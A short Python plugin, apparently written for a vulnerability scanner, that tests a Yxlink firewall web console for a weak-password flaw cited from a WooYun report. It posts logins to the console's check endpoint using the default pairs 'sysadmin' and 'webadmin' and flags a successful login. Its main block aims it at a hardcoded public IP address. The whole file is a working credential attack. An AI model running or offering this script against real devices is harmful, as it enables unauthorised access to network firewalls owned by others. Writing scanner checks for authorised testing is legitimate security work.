#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = '铱迅防火墙 weak password'
#references = 'http://www.wooyun.org/bugs/wooyun-2015-095961'

def assign(service, arg):
    if service == "yxlink":
        return True, arg

def audit(arg):
    target = arg+ 'html/login/check'
    header = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
    passwords = ['sysadmin','webadmin']
    for password in passwords:
        data ="txt_username={name}&txt_password={password}&ext-comp-1002=%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87".format(name=password,password=password) 
        code, head,res, errcode, _   = curl.curl2(target,header=header,post=data)
        if code == 200 and '"success":true,"msg":"success"' in res:
            security_warning(arg+'\npostdata:'+data)  
            break


if __name__ == '__main__':
    from dummy import *
    audit(assign('yxlink', 'https://221.8.74.29/')[1])